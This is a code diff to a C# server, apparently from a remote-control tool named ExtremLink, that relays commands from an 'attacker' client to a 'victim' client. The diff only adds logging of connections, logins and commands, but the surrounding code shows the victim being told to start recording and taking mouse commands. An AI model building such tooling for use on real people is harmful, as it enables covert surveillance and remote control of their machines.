@@ -87,6 +87,7 @@ namespace ExtremLink_Server.Classes
             this.serverIpAddress = this.FindIpAddress();
             this.attacker = new Client(this.serverIpAddress, TypeOfClient.attacker);
             this.victim = new Client(this.serverIpAddress, TypeOfClient.victim);
+            Log.LogInstance.AddMessage("🖧 Server Started");
         }
 
 
@@ -113,6 +114,7 @@ namespace ExtremLink_Server.Classes
             // Input: Nothing.
             // Output: The function connects to the attacker.
             await this.attacker.ConnectToClient();
+            Log.LogInstance.AddMessage("👨‍💻 Attacker connected");
             Task.Run(() => this.HandleAttackerTcpCommunication());
         }
         private async Task ConnectToVictim()
@@ -120,6 +122,7 @@ namespace ExtremLink_Server.Classes
             // Input: Nothing.
             // Output: The function connects to the victim.
             await this.victim.ConnectToClient();
+            Log.LogInstance.AddMessage("💻 Victim connected");
             Task.Run(() => this.HandleVictimTcpCommunication());
             Task.Run(() => this.HandleUdpCommunication());
         }
@@ -221,10 +224,12 @@ namespace ExtremLink_Server.Classes
                     case TypeOfClient.attacker:
                         this.attacker.SendTCPMessageToClient("!", "Exist");
                         this.attacker.User.UserName = username;
+                        Log.LogInstance.AddMessage($"Attacker logged in as: 👤 {this.attacker.User.UserName}");
                         break;
                     case TypeOfClient.victim:
                         this.victim.SendTCPMessageToClient("!", "Exist");
                         this.victim.User.UserName = username;
+                        Log.LogInstance.AddMessage($"Victim logged in as: 👤 {this.victim.User.UserName}");
                         break;
                 }
             }
@@ -315,6 +320,7 @@ namespace ExtremLink_Server.Classes
                     this.victim.SendTCPMessageToClient("&", "StartRecord");
                     break;
             }
+            Log.LogInstance.AddMessage($"Attacker sent {data} command");
         }
 
         // Handling attacker mouse commands messages function:
